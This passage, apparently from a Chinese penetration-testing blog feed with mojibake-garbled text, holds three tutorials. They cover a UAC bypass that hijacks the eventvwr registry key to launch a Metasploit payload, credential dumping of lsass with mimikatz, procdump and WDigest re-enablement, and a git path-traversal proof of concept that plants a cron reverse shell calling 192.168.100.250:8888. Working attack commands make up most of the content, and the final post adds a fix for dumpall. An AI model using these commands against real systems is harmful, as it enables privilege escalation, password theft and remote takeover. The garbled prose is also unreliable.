<p>é¦–å…ˆéœ€è¦ä¿®æ”¹é”®å€¼ <code>HKCU\Software\Classes\mscfile\shell\open\command</code>ï¼Œä¸ºæµ‹è¯•å¯ä»¥æŠŠå€¼æ”¹ä¸º <code>calc.exe</code>ï¼Œ æ‰“å¼€è¿è¡Œï¼Œæ‰§è¡Œregedit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ³¨å†Œè¡¨å†…ï¼š</span><br><span class="line">    HKCU = HKEY_CURRENT_USER</span><br><span class="line">    HKLM = HKEY_LOCAL_MACHINE</span><br><span class="line">    HKCR = HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure>

<p>åœ¨Win7 ä¸­ æˆ‘è¿™é‡Œçš„ <code>regedit</code> ä¸­çš„é”®å€¼åªåˆ° <code>HKCU\Software\Classes\</code> è¿™å±‚ç›®å½•ï¼Œæ‰€ä»¥æˆ‘æ–°å¢äº†åé¢çš„è¡¨é¡¹ï¼Œå¹¶æŠŠå€¼è®¾ä¸º <code>C:\Windows\System32\calc.exe</code>ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085030.png" alt="image-20210119163817241"></p>
<p>å†é‡æ–°å¯åŠ¨<code>eventvwr.exe</code>ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085036.png" alt="image-20210119163926939"></p>
<p>å¹¶ä¸”ä½¿ç”¨Process Monitor æŸ¥çœ‹æƒé™ï¼Œä¹Ÿæ˜¯<code>high</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085040.png" alt="image-20210119164604806"></p>
<p>è€Œæ­£å¸¸å¯åŠ¨è®¡ç®—å™¨</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085048.png" alt="image-20210119164803238"></p>
<p>å®éªŒæˆåŠŸï¼ŒæˆåŠŸç»•è¿‡ UACã€‚</p>
<h4 id="4-2-å®æˆ˜"><a href="#4-2-å®æˆ˜" class="headerlink" title="4.2 å®æˆ˜"></a>4.2 å®æˆ˜</h4><p>ä¿®æ”¹é”®å€¼ <code>HKCU\Software\Classes\mscfile\shell\open\command</code>ï¼Œä¸ºmsfç”Ÿæˆçš„exeï¼Œä¹‹åè¿è¡Œ<code>eventvwr.exe</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085055.png" alt="image-20210119165643571"></p>
<p>ä¸€å¥è¯ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå°†<code>d:\1.exe</code>æ”¹ä¸ºmsfçš„exeåœ°å€ï¼Œå¤åˆ¶åˆ°å‘½ä»¤è¡Œæ‰§è¡Œå³å¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d d:\1.exe /f   <span class="comment">#1.exeä¸ºmsfé©¬</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœç›´æ¥æ‰§è¡Œshell.exeï¼Œåå¼¹å›æ¥çš„ä¼šè¯ä¸èƒ½é€šè¿‡getsystemç›´æ¥ææƒï¼Œå› ä¸ºä¼šè¢«UACæ‹¦æˆª</p>
<p><img src="/images/image-20210119171432120.png" alt="image-20210119171432120"></p>
<p>åŠ«æŒæ³¨å†Œè¡¨åï¼Œå†æ¬¡æ‰§è¡Œeventvwrï¼Œç¨‹åºå°±ä¼šå»æŸ¥æ‰¾åŠ«æŒçš„æ³¨å†Œè¡¨åœ°å€ï¼Œç„¶åä»¥è‡ªåŠ¨ææƒä¹‹åçš„ç®¡ç†å‘˜æƒé™åŠ è½½shell.exeï¼Œæ­¤æ—¶åå¼¹å›æ¥çš„ä¼šè¯å¯é€šè¿‡getsystemç›´æ¥ææƒ</p>
<p><img src="/images/image-20210119170019046.png" alt="image-20210119170019046"></p>
<p>æœ€åè®°å¾—æ¸…é™¤æ³¨å†Œè¡¨é¡¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰§è¡Œeventvwrå‘½ä»¤æ—¶æ‰ä¼šå»æ³¨å†Œè¡¨æŸ¥æ‰¾mmc.exeçš„è·¯å¾„ï¼Œå¦‚æœæ‰§è¡Œçš„æ˜¯mmc.exe eventvwr.mscï¼Œç›´æ¥åŠ è½½mmc.exeï¼Œæ˜¯ä¸ä¼šå»æŸ¥è¯¢æ³¨å†Œè¡¨çš„ã€‚</p>
]]></content>
      <categories>
        <category>åŸŸæ¸—é€</category>
      </categories>
      <tags>
        <tag>Windowsææƒ</tag>
        <tag>åŸŸæ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–</title>
    <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<blockquote>
<p>  æ˜å¹´ä»Šæ—¥ï¼Œäººç”Ÿä¸€å¤§å–œäº‹(â‰§âˆ‡â‰¦)ï¾‰  å¼±å¼±é—®ä¸€å¥æˆ‘å¾ˆèƒ–å—ï¼Ÿ183 165</p>
</blockquote>
<h1 id="Windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–"><a href="#Windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–" class="headerlink" title="Windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–"></a>Windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–</h1><h2 id="0x01-LM-Hashä¸NTLM-Hash"><a href="#0x01-LM-Hashä¸NTLM-Hash" class="headerlink" title="0x01 LM Hashä¸NTLM Hash"></a>0x01 LM Hashä¸NTLM Hash</h2><p>Windowsæ“ä½œç³»ç»Ÿé€šå¸¸ä½¿ç”¨ä¸¤ç§æ–¹æ³•å¯¹ç”¨æˆ·çš„æ˜æ–‡å¯†ç è¿›è¡ŒåŠ å¯†å¤„ç†ã€‚åœ¨åŸŸç¯å¢ƒä¸­ï¼Œç”¨æˆ·ä¿¡æ¯å­˜å‚¨åœ¨<code>ntds.dit</code>ä¸­ï¼ŒåŠ å¯†åä¸ºæ•£åˆ—å€¼ã€‚</p>
<p>Windowsæ“ä½œç³»ç»Ÿä¸­çš„å¯†ç ä¸€èˆ¬ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†ä¸ºLM Hashï¼Œå¦ä¸€éƒ¨åˆ†ä¸ºNTLM Hashã€‚åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼ŒHashçš„ç»“æ„é€šå¸¸å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:RID:LM-HASH:NT-HASH</span><br></pre></td></tr></table></figure>

<blockquote>
<p>  LM Hashçš„å…¨åä¸ºâ€LAN Manager Hashâ€ï¼Œæ˜¯å¾®è½¯ä¸ºäº†æé«˜Windowsæ“ä½œç³»ç»Ÿçš„å®‰å…¨æ€§è€Œé‡‡ç”¨çš„æ•£åˆ—å€¼åŠ å¯†ç®—æ³•ï¼Œå…¶æœ¬è´¨æ˜¯DESåŠ å¯†ã€‚å°½ç®¡LM Hashæ¯”è¾ƒå®¹æ˜“ç ´è§£ï¼Œä½†æ˜¯ä¸ºäº†ä¿è¯ç³»ç»Ÿçš„å…¼å®¹æ€§ï¼ŒWindowsåªæ˜¯å°†LM Hashç¦ç”¨äº†ï¼ˆä» Windows Vista å’Œ Windows 2008 ç‰ˆæœ¬å¼€å§‹ç¦ç”¨ï¼‰ã€‚å¦‚æœLM Hashè¢«ç¦ç”¨äº†ï¼Œæ”»å‡»è€…é€šè¿‡å·¥å…·æŠ“å–çš„LM Hashå€¼é€šå¸¸æ˜¯â€aad3b435b51404eeaad3b435b51404eeâ€(è¡¨ç¤ºLM Hashå€¼ä¸ºç©ºæˆ–è€…è¢«ç¦ç”¨)ã€‚</p>
<p>  NTLM Hashæ˜¯å¾®è½¯ä¸ºäº†åœ¨æé«˜å®‰å…¨æ€§çš„åŒæ—¶ä¿è¯å…¼å®¹æ€§è€Œè®¾è®¡çš„æ•£åˆ—åŠ å¯†ç®—æ³•ã€‚NTLM Hashæ˜¯åŸºäºMD4åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†çš„ã€‚ä¸ªäººç‰ˆä»Windows Vista ä»¥åï¼ŒæœåŠ¡å™¨ç‰ˆä»Windows Server 2003ä»¥åï¼ŒWindowsæ“ä½œç³»ç»Ÿçš„è®¤è¯æ–¹å¼å‡ä¸ºNTLM Hashã€‚</p>
</blockquote>
<h2 id="0x02-æ•£åˆ—å€¼è·å–æ–¹æ³•"><a href="#0x02-æ•£åˆ—å€¼è·å–æ–¹æ³•" class="headerlink" title="0x02 æ•£åˆ—å€¼è·å–æ–¹æ³•"></a>0x02 æ•£åˆ—å€¼è·å–æ–¹æ³•</h2><p>è¦æƒ³åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­æŠ“å–æ•£åˆ—å€¼æˆ–æ˜æ–‡å¯†ç ï¼Œå¿…é¡»å°†æƒé™å‡çº§è‡³Systemã€‚æœ¬åœ°ç”¨æˆ·åï¼Œæ•£åˆ—å€¼å’Œå…¶å®ƒå®‰å…¨éªŒè¯ä¿¡æ¯éƒ½ä¿å­˜åœ¨SAMæ–‡ä»¶ä¸­ã€‚lsass.exeè¿›ç¨‹(å®ƒç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»é™†ç­–ç•¥)ç”¨äºå®ç°Windowsçš„å®‰å…¨ç­–ç•¥ï¼Œå¯ä»¥ä½¿ç”¨å·¥å…·å°†æ•£åˆ—å€¼å’Œæ˜æ–‡å¯†ç ä»å†…å­˜ä¸­çš„lsass.exeè¿›ç¨‹æˆ–SAMæ–‡ä»¶ä¸­å¯¼å‡ºã€‚</p>
<p>åˆ©ç”¨å‰æï¼šæ‹¿åˆ°äº†ç®¡ç†å‘˜æƒé™çš„cmdï¼Œç®¡ç†å‘˜ç”¨å¯†ç ç™»å½•è¿‡æœºå™¨ï¼Œå¹¶è¿è¡Œäº†lsass.exeè¿›ç¨‹ï¼ŒæŠŠå¯†ç ä¿å­˜åœ¨å†…å­˜æ–‡ä»¶lsassè¿›ç¨‹ä¸­ã€‚</p>
<p>åœ¨<strong>KB2871997</strong>ä¹‹å‰ï¼Œ ä½¿ç”¨ Mimikatz å¯ä»¥ç›´æ¥æŠ“å–æ˜æ–‡å¯†ç ã€‚</p>
<p>å½“æœåŠ¡å™¨å®‰è£… <strong>KB2871997</strong> è¡¥ä¸åï¼Œç³»ç»Ÿé»˜è®¤ç¦ç”¨ Wdigest Authï¼ˆ<strong>Windows 2012åŠä»¥ä¸Šç‰ˆæœ¬</strong>ï¼‰ ï¼Œå†…å­˜ï¼ˆlsassè¿›ç¨‹ï¼‰ä¸å†ä¿å­˜æ˜æ–‡å£ä»¤ã€‚Mimikatz å°†è¯»ä¸åˆ°å¯†ç æ˜æ–‡ã€‚<br>    ä½†ç”±äºä¸€äº›ç³»ç»ŸæœåŠ¡éœ€è¦ç”¨åˆ° Wdigest Authï¼Œæ‰€ä»¥è¯¥é€‰é¡¹æ˜¯å¯ä»¥æ‰‹åŠ¨å¼€å¯çš„ã€‚ï¼ˆå¼€å¯åï¼Œéœ€è¦ç”¨æˆ·é‡æ–°ç™»å½•æ‰èƒ½ç”Ÿæ•ˆï¼‰ä¹‹åé€šè¿‡æ‰‹å·¥ä¿®æ”¹æ³¨å†Œè¡¨ + å¼ºåˆ¶é”å± + ç­‰å¾…ç›®æ ‡ç³»ç»Ÿç®¡ç†å‘˜é‡æ–°ç™»å½• &#x3D; æˆªå–æ˜æ–‡å¯†ç </p>
<h3 id="ä½¿ç”¨mimikatzåœ¨çº¿è¯»å–SAMæ–‡ä»¶ï¼ˆç›®æ ‡æ²¡æœ‰æ€è½¯ï¼Œæˆ–è€…mimikatzå·²å…æ€ï¼‰"><a href="#ä½¿ç”¨mimikatzåœ¨çº¿è¯»å–SAMæ–‡ä»¶ï¼ˆç›®æ ‡æ²¡æœ‰æ€è½¯ï¼Œæˆ–è€…mimikatzå·²å…æ€ï¼‰" class="headerlink" title="ä½¿ç”¨mimikatzåœ¨çº¿è¯»å–SAMæ–‡ä»¶ï¼ˆç›®æ ‡æ²¡æœ‰æ€è½¯ï¼Œæˆ–è€…mimikatzå·²å…æ€ï¼‰"></a>ä½¿ç”¨mimikatzåœ¨çº¿è¯»å–SAMæ–‡ä»¶ï¼ˆç›®æ ‡æ²¡æœ‰æ€è½¯ï¼Œæˆ–è€…<code>mimikatz</code>å·²å…æ€ï¼‰</h3><p>ç›´æ¥å°†<code>mimikatz</code>ä¸Šä¼ è‡³ç›®æ ‡æœºå™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;    #åœ¨çº¿è¯»å–æ•£åˆ—å€¼åŠé“­æ–‡å¯†ç </span><br></pre></td></tr></table></figure>

<p>è¯¥æ“ä½œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå¦åˆ™æŠ¥é”™ï¼Œæ— æ³•è¯»å–å¯†ç ï¼ŒæŠ¥é”™ä¿¡æ¯å¦‚ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221939.png" alt="image-20210207221937863"></p>
<p>ç®¡ç†å‘˜æƒé™æ‰§è¡Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221945.png" alt="image-20210207221846491"></p>
<h4 id="ä½¿ç”¨mimikatzç¦»çº¿è¯»å–lsass-dmpæ–‡ä»¶ï¼ˆmimikatzè¢«æ€è½¯æ‹¦æˆªï¼‰"><a href="#ä½¿ç”¨mimikatzç¦»çº¿è¯»å–lsass-dmpæ–‡ä»¶ï¼ˆmimikatzè¢«æ€è½¯æ‹¦æˆªï¼‰" class="headerlink" title="ä½¿ç”¨mimikatzç¦»çº¿è¯»å–lsass.dmpæ–‡ä»¶ï¼ˆmimikatzè¢«æ€è½¯æ‹¦æˆªï¼‰"></a>ä½¿ç”¨mimikatzç¦»çº¿è¯»å–lsass.dmpæ–‡ä»¶ï¼ˆmimikatzè¢«æ€è½¯æ‹¦æˆªï¼‰</h4><p>ï¼ˆ1ï¼‰å¯¼å‡º<code>lsass.dmp</code>æ–‡ä»¶</p>
<p>é€šè¿‡ <code>procdump.exe</code> æ–‡ä»¶å¯¼å‡º<code>lsass.dmp</code>æ–‡ä»¶ï¼ˆProcdumpæ˜¯å¾®è½¯å®˜æ–¹å‘å¸ƒçš„å·¥å…·ï¼Œå¯ä»¥åœ¨å‘½ä»¤è¡Œä¸‹å°†ç›®æ ‡lsassæ–‡ä»¶å¯¼å‡ºï¼Œä¸”æ€æ¯’è½¯ä»¶ä¸ä¼šæ‹¦æˆªï¼‰</p>
<p><code>procdump</code>ä¸‹è½½åœ°å€ï¼š<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
<p><strong>ç®¡ç†å‘˜æƒé™è¿è¡Œ</strong>è¯¥å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207215155.png" alt="image-20210207214123607"></p>
<p>(2ï¼‰ä½¿ç”¨mimikatzå¯¼å‡ºlsass.dmpæ–‡ä»¶ä¸­çš„å¯†ç æ•£åˆ—å€¼</p>
<p>å°†ç›®æ ‡æœºå™¨ä¸Šçš„ <code>lsass.tmp</code> æ‹‰å–åˆ°æœ¬åœ°ï¼Œä¸<code>mimikatz</code>åŒç›®å½•ï¼Œä½¿ç”¨<code>mimikatz</code>è§£å¯†ç›®æ ‡ç³»ç»Ÿå¯†ç ã€‚ï¼ˆæœ¬åœ°æœºå™¨éœ€ä¸ç›®æ ‡æœºå™¨çš„ç‰ˆæœ¬ä½æ•°ä¸€è‡´ï¼‰</p>
<p>è¿è¡Œmimikatz.exe è§£å¯†è¯¥æ–‡ä»¶ã€‚æ³¨ï¼š32ä½å°±ç”¨32ä½çš„<code>mimikatz</code>ç ´è§£ï¼ŒåŒç†64ä½çš„ä¹Ÿæ˜¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207213854.png" alt="image-20210207213852318"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207214737.png" alt="image-20210207214733408"></p>
<h4 id="mimikatzæ— æ³•è¯»å–åˆ°å¯†ç æ—¶"><a href="#mimikatzæ— æ³•è¯»å–åˆ°å¯†ç æ—¶" class="headerlink" title="mimikatzæ— æ³•è¯»å–åˆ°å¯†ç æ—¶"></a>mimikatzæ— æ³•è¯»å–åˆ°å¯†ç æ—¶</h4><p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ç³»ç»Ÿä¸º<strong>Windows 2012R2</strong>ä»¥ä¸Šæˆ–è€…å®‰è£… <strong>KB2871997</strong> è¡¥ä¸æ—¶ï¼Œé»˜è®¤åœ¨å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç ï¼Œå¯†ç å­—æ®µæ˜¾ç¤ºä¸ºnullï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å¼€å¯ï¼Œä½†éœ€è¦ç”¨æˆ·é‡æ–°ç™»å½•åæ‰èƒ½æˆåŠŸæŠ“å–ã€‚</p>
<p><strong>å¼€å¯Wdigest Auth</strong></p>
<ul>
<li><p>cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
</li>
<li><p>powershell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>meterpreter</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>å…³é—­Wdigest Auth</strong></p>
<p>å…³é—­å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<ul>
<li><p>cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
</li>
<li><p>powershell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>meterpreter</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>å¼ºåˆ¶é”å±</strong></p>
<p>åœ¨å¼€å¯ <code>Wdigest Auth</code> åï¼Œéœ€è¦ç®¡ç†å‘˜é‡æ–°ç™»å½•æ‰èƒ½æŠ“æ˜æ–‡å¯†ç ã€‚</p>
<p>å¼ºåˆ¶é”å±ï¼Œè®©ç®¡ç†å‘˜é‡æ–°ç™»å½•ã€‚</p>
<ul>
<li><p>cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>

<p>ç­‰å¾…ç®¡ç†å‘˜é‡æ–°ç™»å½•ï¼Œä¹‹åé‡æ–°è¯»å–ï¼Œå¯è¯»åˆ°æ˜æ–‡å¯†ç ã€‚</p>
</li>
</ul>
]]></content>
      <categories>
        <category>åŸŸæ¸—é€</category>
      </categories>
      <tags>
        <tag>Windowsææƒ</tag>
        <tag>åŸŸæ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>git èœœç½å¤ç°</title>
    <url>/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>  å¥½ä¹…ä¸è§</p>
</blockquote>
<h2 id="0x01-git-èœœç½å¤ç°"><a href="#0x01-git-èœœç½å¤ç°" class="headerlink" title="0x01 git èœœç½å¤ç°"></a>0x01 git èœœç½å¤ç°</h2><p>å…·ä½“åŸç†è¯·çœ‹ <a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> git</span><br><span class="line"></span><br><span class="line">repo = git.Repo.init(path=<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">repo.index.add(items=[<span class="string">&#x27;../../git_poc.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">repo.index.commit(<span class="string">&#x27;commit&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>python3 -m pip install GitPython</code></p>
<p>python3 è¿è¡Œ, ç”ŸæˆPoc </p>
<blockquote>
<p>  åœ¨å½“å‰ç›®å½•çš„..&#x2F;..&#x2F;çš„ç›®å½•ä¸‹å¿…é¡»æœ‰git_poc.txt</p>
</blockquote>
<p>æ¯”å¦‚å½“å‰è„šæœ¬ç›®å½•ä¸º <code>/Users/yhy/Desktop/gitpoc</code>,é‚£ä¹ˆåœ¨<code>/Users/yhy</code>è¦å­˜åœ¨<code>git_poc.txt</code></p>
<p>ç„¶åå°† <strong>.git</strong> æ–‡ä»¶å¤¹æ•´ä½“æ‹–å…¥ç½‘ç«™æ ¹ç›®å½•ä¸‹</p>
<p>æ•ˆæœï¼šé˜²æ­¢å¹²æ‰°æˆ‘ç›´æ¥åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œ <a href="https://github.com/0xHJK/dumpall.git">dumpall</a> å·¥å…·</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174743.png" alt="image-20210809154939407"></p>
<p>æ²¡æœ‰åœ¨ <strong>dumpall&#x2F;192.168.100.250_8080</strong> ç›®å½•ä¸‹ç”Ÿæˆæ–‡ä»¶ï¼Œè€Œæ˜¯è¿›è¡Œäº†<strong>ç›®å½•ç©¿è¶Š</strong>,åœ¨åŸè®¡åˆ’ï¼ˆdumpall&#x2F;192.168.100.250_8080ï¼‰ä¸¤å±‚å¤–çš„ç›®å½•ä¸‹ç”Ÿæˆäº†git_poc</p>
<h3 id="1-1-è®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#1-1-è®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="1.1 è®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>1.1 è®¡åˆ’ä»»åŠ¡åå¼¹shell</h3><p>å…ˆåœ¨&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; ä¸‹æ–°å»ºåä¸º root çš„åå¼¹shellä»£ç æ–‡ä»¶ã€‚</p>
<p><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.100.250/8888 0&gt;&amp;1</code></p>
<p>ç„¶åå°†<code>repo.index.add(items=[&#39;../../git_poc.txt&#39;])</code> ä¸­çš„<code>../../git_poc.txt</code> æ›¿æ¢, ä½¿ç”¨å¤šä¸ª**..&#x2F;**,ç¡®ä¿è¿”å›åˆ°æ ¹ç›®å½• </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">repo.index.add(items=[<span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../../../../var/spool/cron/crontabs/root&#x27;</span>])</span><br></pre></td></tr></table></figure>

<blockquote>
<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root (centosç³»åˆ—ä¸»æœº)</p>
<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root (debianç³»åˆ—ä¸»æœº)</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174751.png" alt="image-20210809173416573"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174728.png" alt="image-20210809173349713"></p>
<h2 id="0x02-ä¿®å¤"><a href="#0x02-ä¿®å¤" class="headerlink" title="0x02 ä¿®å¤"></a>0x02 ä¿®å¤</h2><p>è¿™å°±æ˜¯ä¸ªç›®å½•ç©¿è¶Šæ¼æ´ï¼Œè¿™é‡Œç®€å•ç²—æš´çš„å°† <strong>..&#x2F;</strong> å…¨éƒ¨åˆ é™¤ï¼Œä»¥dumpallä¸ºä¾‹ </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dumpall/dumper.py</span></span><br><span class="line">filename = <span class="built_in">str</span>(filename).replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;/&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174721.png" alt="image-20210809174123558"></p>
<h2 id="0x03åœ¨ubuntuä¸­åå¼¹shellé—®é¢˜"><a href="#0x03åœ¨ubuntuä¸­åå¼¹shellé—®é¢˜" class="headerlink" title="0x03åœ¨ubuntuä¸­åå¼¹shellé—®é¢˜"></a>0x03åœ¨ubuntuä¸­åå¼¹shellé—®é¢˜</h2><p>æœ‰å¸ˆå‚…ååº”è¯´ä¸Šä¸€ç¯‡<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484658&idx=1&sn=84f39840f9a8104edc4fde4c7962fed6&chksm=c2829debf5f514fd40c1abbe73beabe02b2cbe1e190504bb5e060ab445d1cab086c247674fa4&scene=21#wechat_redirect">git èœœç½å¤ç°</a>æ–‡ç« ä¸­åœ¨ubuntuå’Œkaliå†™å…¥äº†è®¡åˆ’ä»»åŠ¡ï¼Œè¿˜æ˜¯ä¸èƒ½åå¼¹shellã€‚</p>
<p>å…³äºè¿™ä¸€ç‚¹æˆ‘åœ¨åšå®éªŒæ—¶ï¼Œä¸€å¼€å§‹ä¹Ÿæ˜¯æ²¡æœ‰åå¼¹shellï¼Œæˆ‘æ‰‹åŠ¨ç¼–è¾‘äº†å‡ érootæ–‡ä»¶ï¼Œå…·ä½“å¼¹shellçš„ä»£ç å¹¶æ²¡æœ‰æ”¹å˜ï¼Œç„¶åå°±è«åå…¶å¦™çš„å¼¹å›æ¥äº†ï¼Œå¿™ç€å‘æ–‡ï¼Œä¹Ÿå°±æ²¡æœ‰å†æ¬¡å®éªŒï¼Œæˆ‘çš„é”™ã€‚</p>
<p>ä»Šå¤©åˆè¯•äº†å¥½å¤šæ¬¡ï¼Œè¿˜æ˜¯å¼¹ä¸å›æ¥ï¼Œç»ˆäºæ‰¾åˆ°äº†åŸå› ï¼Œè¿™ä¸œè¥¿å°±æ˜¯<strong>ubuntuç³»ç»Ÿçš„åŸå› ï¼Œrootæ–‡ä»¶çš„æƒé™å¿…é¡»ä¸º600</strong>ï¼Œè¿˜æœ‰å°±æ˜¯å¼¹çš„ä»£ç ä¹Ÿæœ‰ç‚¹é—®é¢˜ï¼Œè¿™æ˜¯åŸæ–‡é“¾æ¥ï¼š</p>
<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
<p>shellä¸èƒ½åå¼¹ï¼Œå¯ä»¥å†™sshå…¬é’¥ç­‰ï¼Œæœ€åä»–ç»™çš„å¼¹shellä»£ç <strong>å¥½åƒ</strong>è¿˜æœ‰ç‚¹é—®é¢˜ï¼Œåœ¨ä»£ç å‰åç©ºä¸€æ ¼ï¼Œå†™å…¥æ¢è¡Œç¬¦</p>
